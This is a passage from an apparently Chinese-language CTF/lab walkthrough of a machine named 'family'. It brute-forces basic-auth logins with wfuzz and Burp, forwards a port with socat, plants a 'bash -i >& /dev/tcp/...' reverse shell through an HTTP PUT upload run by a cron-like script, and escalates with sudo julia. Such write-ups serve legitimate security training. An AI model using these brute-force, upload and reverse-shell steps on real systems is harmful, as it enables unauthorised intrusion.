</span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;superman&quot;                                                                              </span><br><span class="line">000000046:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;joshua&quot;                                                                                </span><br><span class="line">000000007:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;1234567&quot;                                                                               </span><br><span class="line">000000015:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;lovely&quot;                                                                                </span><br><span class="line">000000047:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;bubbles&quot;                                                                               </span><br><span class="line">000000048:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;1234567890&quot;                                                                            </span><br><span class="line">000000031:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;friends&quot;                                                                               </span><br><span class="line">000000045:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;jennifer&quot;                                                                              </span><br><span class="line">000000038:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;loveme&quot;                                                                                </span><br><span class="line">000000041:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;football&quot;                                                                              </span><br><span class="line">000000036:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;liverpool&quot;                                                                             </span><br><span class="line">000000043:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;andrea&quot;                                                                                </span><br><span class="line">000000040:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;123123&quot;                                                                                </span><br><span class="line">000000037:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;justin&quot;                                                                                </span><br><span class="line">000000044:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;carlos&quot;                                                                                </span><br><span class="line">000000039:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;fuckyou&quot;                                                                               </span><br><span class="line">000000042:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;secret&quot;                                                                                </span><br><span class="line">000000035:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;jordan&quot;                                                                                </span><br><span class="line">000000027:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;chocolate&quot;                                                                             </span><br><span class="line">000000032:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;butterfly&quot;                                                                             </span><br><span class="line">000000025:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;tigger&quot;                                                                                </span><br><span class="line">000000033:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;purple&quot;                                                                                </span><br><span class="line">000000029:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;soccer&quot;                                                                                </span><br><span class="line">000000026:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;sunshine&quot;                                                                              </span><br><span class="line">000000034:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;angel&quot;                                                                                 </span><br><span class="line">000000028:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;password1&quot;                                                                             </span><br><span class="line">000000030:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;anthony&quot;                                                                               </span><br><span class="line">zsh: killed     wfuzz -c -u http://192.168.58.62:631/admin/ --basic mum:FUZZ -w rockyou.txt -</span><br></pre></td></tr></table></figure></div>

<p>-c å¸¦é¢œè‰²è¾“å‡º â€“basic æ ¼å¼ä¸ºâ€œuser:passâ€æˆ–â€œFUZZ:FUZZâ€ -b æŒ‡å®šcookie -Z æ‰«ææ¨¡å¼  -dä½¿ç”¨postæ•°æ®ï¼ˆä¾‹å¦‚ï¼šâ€œid&#x3D;FUZZ&amp;catalog&#x3D;1â€ï¼‰<br>ä½†æ˜¯æ‰«å‡ºæ¥å¾ˆå¤šä¸ªï¼Œç°åœ¨æŠŠå¾—åˆ°çš„ç»“æœå½“ä½œä¸€ä¸ªå­—å…¸ï¼Œå†å»ç”¨bpçˆ†ç ´ç™»å½•ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">cat</span> tmp | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">123456</span><br><span class="line">123456789</span><br><span class="line">hannah</span><br><span class="line">superman</span><br><span class="line">joshua</span><br><span class="line">1234567</span><br><span class="line">lovely</span><br><span class="line">bubbles</span><br><span class="line">1234567890</span><br><span class="line">friends</span><br><span class="line">jennifer</span><br><span class="line">loveme</span><br><span class="line">football</span><br><span class="line">liverpool</span><br><span class="line">andrea</span><br><span class="line">123123</span><br><span class="line">justin</span><br><span class="line">carlos</span><br><span class="line">fuckyou</span><br><span class="line">secret</span><br><span class="line">jordan</span><br><span class="line">chocolate</span><br><span class="line">butterfly</span><br><span class="line">tigger</span><br><span class="line">purple</span><br><span class="line">soccer</span><br><span class="line">sunshine</span><br><span class="line">angel</span><br><span class="line">password1</span><br><span class="line">anthony</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">cat</span> tmp | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;&quot;&#x27;</span> &gt; pass </span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67cac50f066befcec6e05ddb.png"><br>åœ¨bpçœ‹åˆ°è¿™é‡Œä¼ å…¥è´¦å·å¯†ç çš„æ–¹å¼æ˜¯åœ¨Basicè¿™é‡Œï¼Œå¹¶ä¸”ç”¨äº†base64ï¼Œæ ¼å¼æ˜¯mum:password<br><img src="https://pic1.imgdb.cn/item/67cac592066befcec6e05e06.png"><br>æŠŠåˆšæ‰çš„å­—å…¸æ‹¿è¿›æ¥ï¼Œç„¶ååŠ ä¸Šä¸€ä¸ªå‰ç¼€ä»¥åŠç”¨base64ç¼–ç  æœ€ä¸‹é¢çš„url encodeä¹Ÿè¦å–æ¶ˆï¼Œå› ä¸ºbase64é‡Œé¢æœ‰&#x3D;å·<br><img src="https://pic1.imgdb.cn/item/67cac658066befcec6e05e22.png"><br>æˆåŠŸæ‰¾åˆ°å¯†ç <code>lovely</code><br>ç™»å½•åˆ°mumçš„shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh mum@<span class="number">192.168</span>.<span class="number">58.62</span>           </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.58.62 (192.168.58.62)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:vZEvCqRgxS6H8cJ6Umlp0yPH8QAidaOqPupC9t/CPr0.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.58.62&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">mum@<span class="number">192.168</span>.<span class="number">58.62</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux family <span class="number">5.10</span>.<span class="number">0</span>-<span class="number">18</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">5.10</span>.<span class="number">140</span>-<span class="number">1</span> (<span class="number">2022</span>-<span class="number">09</span>-<span class="number">02</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sun Oct <span class="number">23</span> <span class="number">17</span>:<span class="number">43</span>:<span class="number">43</span> <span class="number">2022</span> <span class="keyword">from</span> fe80::d63d:<span class="number">7</span>eff:fef1:<span class="number">3736%</span>enp0s3</span><br><span class="line">-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-<span class="number">8</span>)</span><br><span class="line">mum@family:~$ </span><br></pre></td></tr></table></figure></div>


<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="mum"><a href="#mum" class="headerlink" title="mum"></a>mum</h2><p>mumç›®å½•ä¸‹æ²¡æœ‰ä»»ä½•æ–‡ä»¶ï¼Œæ²¡æœ‰sudoï¼Œsuidä¹Ÿæ²¡æœ‰<br>å»dadçš„ç›®å½•ä¸‹é¢ï¼Œå‘ç°æœ‰ä¸¤ä¸ªæ–‡ä»¶æ˜¯ç”±æ‰§è¡Œå’Œè¯»æƒé™çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">mum@family:/home/dad$ ls -al</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x<span class="number"> 5 </span>dad  dad <span class="number"> 4096 </span>Oct<span class="number"> 25 </span><span class="number"> 2022 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 5 </span>root root<span class="number"> 4096 </span>Oct<span class="number"> 11 </span><span class="number"> 2022 </span>..</span><br><span class="line">lrwxrwxrwx<span class="number"> 1 </span>dad  dad    <span class="number"> 9 </span>Oct <span class="number"> 2 </span><span class="number"> 2022 </span>.bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>dad  dad  <span class="number"> 220 </span>Oct <span class="number"> 2 </span><span class="number"> 2022 </span>.bash_logout</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>dad  dad <span class="number"> 3526 </span>Oct<span class="number"> 24 </span><span class="number"> 2022 </span>.bashrc</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>dad  dad <span class="number"> 4096 </span>Oct<span class="number"> 22 </span><span class="number"> 2022 </span>.local</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>dad  dad  <span class="number"> 807 </span>Oct <span class="number"> 2 </span><span class="number"> 2022 </span>.profile</span><br><span class="line">drwx------<span class="number"> 2 </span>dad  dad <span class="number"> 4096 </span>Oct<span class="number"> 23 </span><span class="number"> 2022 </span>.ssh</span><br><span class="line">-rwxr-xr-x<span class="number"> 1 </span>dad  dad  <span class="number"> 620 </span>Oct<span class="number"> 25 </span><span class="number"> 2022 </span>project</span><br><span class="line">drwxr-xr-x<span class="number"> 2 </span>dad  dad <span class="number"> 4096 </span>Oct<span class="number"> 23 </span><span class="number"> 2022 </span>survey</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">mum@family:/home/dad$ <span class="built_in">cat</span> project </span><br><span class="line"><span class="comment">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line">find / -user mum -writable -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -user mum -<span class="built_in">type</span> f -name -<span class="built_in">exec</span> grep -il <span class="string">&#x27;password&#x27;</span> &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -user mum -<span class="built_in">type</span> f -name <span class="string">&quot;id_rsa&quot;</span> 2&gt;/dev/null</span><br><span class="line">find / -user mum -<span class="built_in">type</span> f -name <span class="string">&quot;authorized_keys&quot;</span> 2&gt;/dev/null</span><br><span class="line">find / -mmin -30 -user mum 2&gt;/dev/null | grep -v <span class="string">&quot;/proc/*&quot;</span></span><br><span class="line">find /home/dad -<span class="built_in">type</span> f ! -name <span class="string">&quot;project&quot;</span> -user dad -executable -<span class="built_in">exec</span> <span class="built_in">mv</span> <span class="string">&quot;&#123;&#125;&quot;</span> ~/survey \; </span><br><span class="line"><span class="built_in">cat</span> /var/mail/mum</span><br><span class="line"><span class="built_in">cat</span> /home/mum/.bash_history 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> /var/spool/cups/d0002*</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ~/survey/* ; <span class="keyword">do</span> [[ -O <span class="variable">$file</span> ]] &amp;&amp; bash <span class="variable">$file</span> 2&gt;/dev/null ; <span class="keyword">done</span></span><br><span class="line">strings /dev/mem -n100 | grep -i mum</span><br><span class="line"><span class="built_in">who</span> -u |grep mum</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå¦‚æœsurveyæœ‰æ–‡ä»¶å°±æ‰§è¡Œï¼Œä½†æ˜¯ç°åœ¨surveyæœ‰ä¸€ä¸ªpyæ–‡ä»¶æˆ‘ä»¬çœ‹ä¸äº†ï¼Œçœ‹çœ‹ç°åœ¨çš„ç«¯å£æƒ…å†µ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">mum<span class="variable">@family</span><span class="symbol">:/home/dad/survey</span><span class="variable">$ </span>ss -tulnp</span><br><span class="line"><span class="title class_">Netid</span>          <span class="title class_">State</span>           <span class="title class_">Recv</span>-Q          <span class="title class_">Send</span>-Q                   <span class="title class_">Local</span> <span class="symbol">Address:</span><span class="title class_">Port</span>                    <span class="title class_">Peer</span> <span class="symbol">Address:</span><span class="title class_">Port</span>         <span class="title class_">Process</span>          </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                              <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">5353</span>                         <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                              <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">35669</span>                        <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                              <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">68</span>                           <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                              <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">631</span>                          <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                                 [::]<span class="symbol">:</span><span class="number">5353</span>                            [::]<span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                                 [::]<span class="symbol">:</span><span class="number">41905</span>                           [::]<span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">128</span>                            <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">22</span>                           <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">128</span>                            <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">631</span>                          <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">5</span>                            <span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">8000</span>                         <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">128</span>                               [::]<span class="symbol">:</span><span class="number">22</span>                              [::]<span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">128</span>                               [::]<span class="symbol">:</span><span class="number">631</span>                             [::]<span class="symbol">:*</span>  </span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå‘ç°<code>127.0.0.1:8000</code> è¿™é‡Œå‘ç°8000ç«¯å£å¼€ç€ï¼Œç”¨socatæ¥å®ç°ç«¯å£è½¬å‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">mum<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>wget <span class="number">192.168</span>.<span class="number">58.11</span>/socat</span><br><span class="line">--<span class="number">2025</span>-<span class="number">03</span>-<span class="number">07</span> <span class="number">11</span><span class="symbol">:</span><span class="number">42</span><span class="symbol">:</span><span class="number">39</span>--  <span class="symbol">http:</span>/<span class="regexp">/192.168.58.11/socat</span></span><br><span class="line"><span class="title class_">Connecting</span> to <span class="number">192.168</span>.<span class="number">58.11</span><span class="symbol">:</span><span class="number">80</span>... connected.</span><br><span class="line"><span class="variable constant_">HTTP</span> request sent, awaiting response... <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Length</span>: <span class="number">375176</span> (366K) [application/octet-stream]</span><br><span class="line"><span class="title class_">Saving</span> <span class="symbol">to:</span> <span class="string">&#x27;socat&#x27;</span></span><br><span class="line"></span><br><span class="line">socat                                  <span class="number">100</span><span class="string">%[=========================================================================&gt;]</span> <span class="number">366</span>.38K  <span class="number">1</span>.63MB/s    <span class="keyword">in</span> <span class="number">0</span>.2s    </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">03</span>-<span class="number">07</span> <span class="number">11</span><span class="symbol">:</span><span class="number">42</span><span class="symbol">:</span><span class="number">40</span> (<span class="number">1.63</span> <span class="variable constant_">MB</span>/s) - <span class="string">&#x27;socat&#x27;</span> saved [<span class="number">375176</span>/<span class="number">375176</span>]</span><br><span class="line"></span><br><span class="line">mum<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x socat</span><br><span class="line">mum<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>./socat <span class="variable constant_">TCP</span>-<span class="variable constant_">LISTEN</span><span class="symbol">:</span><span class="number">8080</span>,fork <span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">8000</span>  </span><br><span class="line">^<span class="title class_">Cmum</span><span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>./socat <span class="variable constant_">TCP</span>-<span class="variable constant_">LISTEN</span><span class="symbol">:</span><span class="number">8080</span>,fork <span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">8000</span>  ^C</span><br><span class="line">mum<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>./socat <span class="variable constant_">TCP</span>-<span class="variable constant_">LISTEN</span><span class="symbol">:</span><span class="number">8080</span>,fork <span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">8000</span>  &amp;</span><br><span class="line">[<span class="number">1</span>] <span class="number">34365</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æŠŠ127.0.0.1:8000 è½¬å‘åˆ°8080ç«¯å£ ç”¨<code>&amp;</code>åœ¨åå°è¿›è¡Œ<br>ç°åœ¨å»è®¿é—®8080ç«¯å£å°±æœ‰ä¸œè¥¿äº†ï¼Œè¿™é‡Œæ˜¯æ˜¾ç¤ºè¿”å›ä¸ºç©º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="meta"># curl 192.168.58.62:8080</span></span><br><span class="line">curl: (<span class="number">52</span>) Empty reply <span class="keyword">from</span> <span class="keyword">server</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ¯”è¾ƒéš¾æƒ³çš„ç‚¹å°±æ˜¯æ€ä¹ˆæŠŠæ–‡ä»¶å†™å…¥åˆ°è¿™ä¸ªsurveyç›®å½•ä¸‹é¢ï¼Œå› ä¸ºè¿™é‡Œçš„projectä¼šæ‰§è¡Œæ‰€æœ‰surveyä¸‹é¢çš„æ–‡ä»¶<br>è¿™é‡Œæ˜¯ç”¨äº†ä¸€ä¸ªniktoæ‰«æäº†ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nikto -h <span class="number">192.168</span><span class="number">.58</span><span class="number">.39</span>:<span class="number">8080</span></span><br><span class="line">- Nikto v2<span class="number">.5</span><span class="number">.0</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          <span class="number">192.168</span><span class="number">.58</span><span class="number">.39</span></span><br><span class="line">+ Target Hostname:    <span class="number">192.168</span><span class="number">.58</span><span class="number">.39</span></span><br><span class="line">+ Target Port:        <span class="number">8080</span></span><br><span class="line">+ <span class="keyword">Start</span> <span class="type">Time</span>:         <span class="number">2025</span><span class="number">-03</span><span class="number">-07</span> <span class="number">19</span>:<span class="number">20</span>:<span class="number">02</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: SimpleHTTP/<span class="number">0.6</span> Python/<span class="number">2.7</span><span class="number">.18</span></span><br><span class="line">+ /: The anti-clickjacking X-Frame-<span class="keyword">Options</span> <span class="keyword">header</span> <span class="keyword">is</span> <span class="keyword">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-<span class="keyword">Options</span></span><br><span class="line">+ /: The X-Content-<span class="keyword">Type</span>-<span class="keyword">Options</span> <span class="keyword">header</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">set</span>. This could allow the <span class="keyword">user</span> agent <span class="keyword">to</span> render the content <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class="keyword">type</span>-<span class="keyword">header</span>/</span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="built_in">found</span> (use <span class="string">&#x27;-C all&#x27;</span> <span class="keyword">to</span> force <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ Python/<span class="number">2.7</span><span class="number">.18</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> at least <span class="number">3.9</span><span class="number">.6</span>).</span><br><span class="line">+ SimpleHTTP/<span class="number">0.6</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> at least <span class="number">1.2</span>).</span><br><span class="line"></span><br><span class="line">mum@<span class="keyword">family</span>:/home/dad/survey$ ls</span><br><span class="line"><span class="keyword">index</span>.html  nikto-test-LsluKoIs.html  <span class="keyword">server</span>.py</span><br></pre></td></tr></table></figure></div>
<p>ç»“æœå‘ç°åœ¨surveyä¸‹é¢å¤šäº†ä¸€ä¸ª nikto-test-LsluKoIs.htmlï¼Œå› ä¸ºåœ¨niktoæ‰«æçš„æ—¶å€™ä¼šå°è¯•ä¸Šä¼ æ–‡ä»¶ï¼Œè¯´æ˜è¿™ä¸ªé¡µé¢æ˜¯å¯ä»¥ä¸Šä¼ æ–‡ä»¶<br>æ‰€ä»¥ç”¨PUTè¯·æ±‚æ–¹å¼ä¸Šä¼ ä¸€ä¸ªåå¼¹shellçš„shæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl -X PUT 192.168.58.39:8080/reverse -d <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.58.11/1234 0&gt;&amp;1&quot;</span>                                               </span><br><span class="line">curl: (52) Empty reply <span class="keyword">from</span><span class="built_in"> server</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"> mum@family:/home/dad$ ./project </span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234                </span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process<span class="built_in"> group </span>(5833): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> this shell</span><br><span class="line">dad@family:~$ id</span><br><span class="line"><span class="attribute">uid</span>=1000(dad) <span class="attribute">gid</span>=1000(dad) <span class="attribute">groups</span>=1000(dad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)</span><br><span class="line">dad@family:~$ id</span><br><span class="line"><span class="attribute">uid</span>=1000(dad) <span class="attribute">gid</span>=1000(dad) <span class="attribute">groups</span>=1000(dad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)</span><br><span class="line">dad@family:~$ </span><br></pre></td></tr></table></figure></div>

<h2 id="dad"><a href="#dad" class="headerlink" title="dad"></a>dad</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">dad<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> dad on <span class="symbol">family:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> dad may run the following commands on <span class="symbol">family:</span></span><br><span class="line">    (baby) <span class="symbol">NOPASSWD:</span> /usr/bin/julia</span><br></pre></td></tr></table></figure></div>
<p>åœ¨gtfobinsé‡Œé¢æ‰¾åˆ°ææƒæ–¹å¼  <code>sudo julia -e &#39;run(</code>&#x2F;bin&#x2F;sh<code>)&#39; </code><br>å¾—åˆ°babyçš„shell</p>
